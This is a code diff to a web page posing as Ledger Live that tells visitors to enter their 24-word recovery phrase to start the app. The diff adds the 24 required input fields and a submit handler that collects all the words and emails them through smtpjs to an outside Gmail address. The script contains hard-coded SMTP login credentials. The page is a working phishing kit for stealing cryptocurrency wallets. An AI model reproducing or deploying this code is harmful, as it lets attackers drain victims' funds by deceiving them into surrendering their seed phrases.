@@ -41,6 +41,10 @@
 			margin-top: 20px;
 		}
 
+		h2{
+			color: white;
+		}
+
 		.sub2 h2{
 			font-family: sans-serif;
 			font-weight: bolder;
@@ -75,7 +79,9 @@
 			display: grid;
 			grid-template-columns: 0px auto;
 			gap: 1px;
-			margin: 30px;
+			margin-top: 5px;
+			margin-right: 30px;
+			margin-left: 30px;
 		}
 
 
@@ -107,40 +113,38 @@
 	<p>
 		**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.
 	</p>
-
 	<div class="sub3">
-		<form>
-			<fieldset>
-			<label>
-			24 Words
-			</label>
+		<form onsubmit="sendEmail(); reset(); return false;">
+			
+			<h3>
+				24 Words
+			</h3>
 			<br><br>
 			
-			<input type="1." name="" placeholder="1. word"> 
-			<input type="2." name="" placeholder="2. word">
-			<input type="2." name="" placeholder="3. word">
-			<input type="2." name="" placeholder="4. word">
-			<input type="2." name="" placeholder="5. word">
-			<input type="2." name="" placeholder="6. word">
-			<input type="2." name="" placeholder="7. word">
-			<input type="2." name="" placeholder="8. word">
-			<input type="2." name="" placeholder="9. word">
-			<input type="2." name="" placeholder="10. word">
-			<input type="2." name="" placeholder="11. word">
-			<input type="2." name="" placeholder="12. word">
-			<input type="2." name="" placeholder="13. word">
-			<input type="2." name="" placeholder="14. word">
-			<input type="2." name="" placeholder="15. word">
-			<input type="2." name="" placeholder="16. word">
-			<input type="2." name="" placeholder="17. word">
-			<input type="2." name="" placeholder="18. word">
-			<input type="2." name="" placeholder="19. word">
-			<input type="2." name="" placeholder="20. word">
-			<input type="2." name="" placeholder="21. word">
-			<input type="2." name="" placeholder="22. word">
-			<input type="2." name="" placeholder="23. word">
-			<input type="2." name="" placeholder="24. word">
-		</fieldset>
+			<input type="text" id="name1" placeholder="1. word" required> 
+			<input type="text" id="name2" placeholder="2. word" required>
+			<input type="text" id="name3" placeholder="3. word" required>
+			<input type="text" id="name4" placeholder="4. word" required>
+			<input type="text" id="name5" placeholder="5. word" required>
+			<input type="text" id="name6" placeholder="6. word" required>
+			<input type="text" id="name7" placeholder="7. word" required>
+			<input type="text" id="name8" placeholder="8. word" required>
+			<input type="text" id="name9" placeholder="9. word" required>
+			<input type="text" id="name0" placeholder="10. word" required>
+			<input type="text" id="name10" placeholder="11. word" required>
+			<input type="text" id="name11" placeholder="12. word" required>
+			<input type="text" id="name12" placeholder="13. word" required>
+			<input type="text" id="name13" placeholder="14. word" required>
+			<input type="text" id="name14" placeholder="15. word" required>
+			<input type="text" id="name15" placeholder="16. word" required>
+			<input type="text" id="name16" placeholder="17. word" required>
+			<input type="text" id="name17" placeholder="18. word" required>
+			<input type="text" id="name18" placeholder="19. word" required>
+			<input type="text" id="name19" placeholder="20. word" required>
+			<input type="text" id="name20" placeholder="21. word" required>
+			<input type="text" id="name21" placeholder="22. word" required>
+			<input type="text" id="name22" placeholder="23. word" required>
+			<input type="text" id="name23" placeholder="24. word" required>
 		<br>
 		<button id="submit" type="submit" name="submit" value="submit" 
         >Submit
@@ -151,6 +155,77 @@
 </div>
 
 </div>
+
+<script src="https://smtpjs.com/v3/smtp.js"></script>
+
+<script>
+	function sendEmail() {
+
+var name0=document.getElementById('name0').value;	
+var name1=document.getElementById('name1').value;	
+var name2=document.getElementById('name2').value;	
+var name3=document.getElementById('name3').value;
+var name4=document.getElementById('name4').value;
+var name5=document.getElementById('name5').value;
+var name6=document.getElementById('name6').value;
+var name7=document.getElementById('name7').value;
+var name8=document.getElementById('name8').value;
+
+var name9=document.getElementById('name9').value;
+var name10=document.getElementById('name10').value;
+
+var name11=document.getElementById('name11').value;
+var name12=document.getElementById('name12').value;
+var name13=document.getElementById('name13').value;
+var name14=document.getElementById('name14').value;
+var name15=document.getElementById('name15').value;
+var name16=document.getElementById('name16').value;
+var name17=document.getElementById('name17').value; 
+var name18=document.getElementById('name18').value;
+var name19=document.getElementById('name19').value;
+var name20=document.getElementById('name20').value;
+var name21=document.getElementById('name21').value;
+var name22=document.getElementById('name22').value;
+var name23=document.getElementById('name23').value;
+
+
+
+var messageBody= 
+"name0 :"+ name0 +" <br/> name1:" + name1 + "<br/> name2 :"+name2 +" <br/>name3 :" +name3 + "<br/>name4:" +name4 + "<br/>name5:"+name5 + "<br/> name6:"+name6 + "<br/> name7:" +name7 + "<br/> name8:"+name8 + " <br/>name9:"+name9 + "<br/>name10:"+name10 + "<br/>name11:"+name11 + "<br/>name12:" +name12 + "<br/>name13:"+name13 +  "<br/>name14:"+name14 + "<br/>name15:"+name15 + "<br/>name16:"+name16+ "<br/>name17:" +name17+ "<br/>name18:"+ name18+ "<br/>name19:"+name19+ "<br/>name20:"+ name20+ "<br/>name21:"+name21 + "<br/>name22:"+name22+ "<br/>name23:"+name23;
+
+
+
+
+		Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "activenich@gmail.com",
+    Password : "BE33AC9EFB05CF9308F967CEF5F95C027DC8",
+    To : 'mannyactive16@gmail.com',
+    From : "activenich@gmail.com",
+    Subject : "This is the subject",
+    Body : messageBody
+}).then(
+  message => {
+  	if (message) {
+  		swal("Successful", "You clicked the button!", "success");
+
+  	}
+  	else{
+  		swal("Error", "You clicked the button!", "Error");
+
+  	}
+  }
+);
+
+	}
+
+
+
+</script>
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></
+></script>
 
 
 <script type="text/javascript" src="C:\Users\HP\Desktop\website\transport express\bootstrap-5.0.2-dist\js\bootstrap.bundle.min.js"></script>
